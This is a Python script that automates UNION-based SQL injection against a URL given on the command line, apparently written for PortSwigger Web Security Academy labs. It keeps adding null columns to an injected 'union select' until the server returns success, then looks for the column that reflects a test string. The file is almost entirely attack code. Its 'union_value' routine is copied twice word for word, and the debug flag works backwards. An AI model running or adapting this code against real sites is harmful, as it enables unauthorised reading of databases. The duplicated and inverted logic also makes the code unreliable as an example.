import requests
from bs4 import BeautifulSoup as bs4
import logging
import argparse
import urllib.parse as urlparse


def get_arg():
    """ Takes nothing
Purpose: Gets arguments from command line
Returns: Argument's values
"""
    parser = argparse.ArgumentParser()
    parser.add_argument("-d","--debug",dest="debug",action="store_true",help="Turn on debugging",default=False)
    parser.add_argument("-u","--url",dest="url",help="Single URL to spider")    
    parser.add_argument("-o","--option",dest="option",help="Which module to load")    
    parser.add_argument("-r","--regex",dest="regex", action="append", nargs="*", help="Custom regex to look for (You can add as many as you'd like)")
    options = parser.parse_args()
    if not options.debug:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
    return options


def main():
    print("Please note: This program's code needs to be modified and is not ment to be ran purely from a terminal")
    options = get_arg()

    if not options.option:
        choice = ""
    else:
        choice = options.option

    if not options.url:
        url = ""
    else:
        url = options.url
    attack(choice,url)


def attack(choice, url):
    logging.debug("Option Selected: {}".format(choice))
    logging.debug("Url Given: {}".format(url))

    # Union SQLi attack    
    # https://portswigger.net/web-security/sql-injection/union-attacks
    # How many columns are accessible
    if choice == "union":
        r = requests.get(url)
        if r.status_code == 200:
            logging.info("Able to connect to {}. Starting Union attack.".format(url))
            modded_url = "{}' union select null".format(url)
            final_url = modded_url + "--"
            r = requests.get(final_url)
            # logging.debug(bs4(r.content, features="lxml"))
            logging.debug(r.status_code)
            while r.status_code != 200:
                modded_url = modded_url + ",null"
                final_url = modded_url + "--"
                r = requests.get(final_url)
                # logging.debug(bs4(r.content, features="lxml"))
                logging.debug(r.status_code)
            print("Congradulations!!!\nHere is the url that returned something: {}".format(final_url))

        else:
            logging.fatal("Error! Status code is {}".format(r.status_code))

    # Union SQLi attack    
    # https://portswigger.net/web-security/sql-injection/union-attacks
    # Which will return a string
    if choice == "union_value":
        counter = 1
        attempt = 0
        test_string = "EJsugo"
        r = requests.get(url)
        if r.status_code == 200:
            logging.info("Able to connect to {}. Starting Union attack.".format(url))
            modded_url = "{}' union select null".format(url)
            final_url = modded_url + "--"
            r = requests.get(final_url)
            logging.debug(r.status_code)
            while r.status_code != 200:
                modded_url = modded_url + ",null"
                final_url = modded_url + "--"
                counter += 1
                r = requests.get(final_url)
                logging.debug(r.status_code)
            print("Congradulations!!!\nHere is the url that returned something: {}\nNumber of nulls added: {}".format(final_url, counter))
            base_url = url + "' union select "
            while attempt != counter:
                attempt_url = base_url + ('null,' * attempt) + "'{}',".format(test_string) + ('null,' * (counter - attempt - 1))
                if attempt_url[-1:] == ',':
                    attempt_url = attempt_url[:-1]
                attempt_url = attempt_url + "--"
                r = requests.get(attempt_url)
                if r.status_code == 200:
                    break
                attempt += 1
            print("Congradulations!!!\nHere is the url that returned something: {}\nLocation #: {}".format(attempt_url,(attempt+1)))

        else:
            logging.fatal("Error! Status code is {}".format(r.status_code))

    # Union SQLi attack    
    # https://portswigger.net/web-security/sql-injection/union-attacks
    # Which will return a string
    if choice == "union_value":
        counter = 1
        attempt = 0
        test_string = "EJsugo"
        r = requests.get(url)
        if r.status_code == 200:
            logging.info("Able to connect to {}. Starting Union attack.".format(url))
            modded_url = "{}' union select null".format(url)
            final_url = modded_url + "--"
            r = requests.get(final_url)
            logging.debug(r.status_code)
            while r.status_code != 200:
                modded_url = modded_url + ",null"
                final_url = modded_url + "--"
                counter += 1
                r = requests.get(final_url)
                logging.debug(r.status_code)
            print("Congradulations!!!\nHere is the url that returned something: {}\nNumber of nulls added: {}".format(final_url, counter))
            base_url = url + "' union select "
            while attempt != counter:
                attempt_url = base_url + ('null,' * attempt) + "'{}',".format(test_string) + ('null,' * (counter - attempt - 1))
                if attempt_url[-1:] == ',':
                    attempt_url = attempt_url[:-1]
                attempt_url = attempt_url + "--"
                r = requests.get(attempt_url)
                if r.status_code == 200:
                    break
                attempt += 1
            print("Congradulations!!!\nHere is the url that returned something: {}\nLocation #: {}".format(attempt_url,(attempt+1)))

        else:
            logging.fatal("Error! Status code is {}".format(r.status_code))


if __name__ == "__main__":
    main()
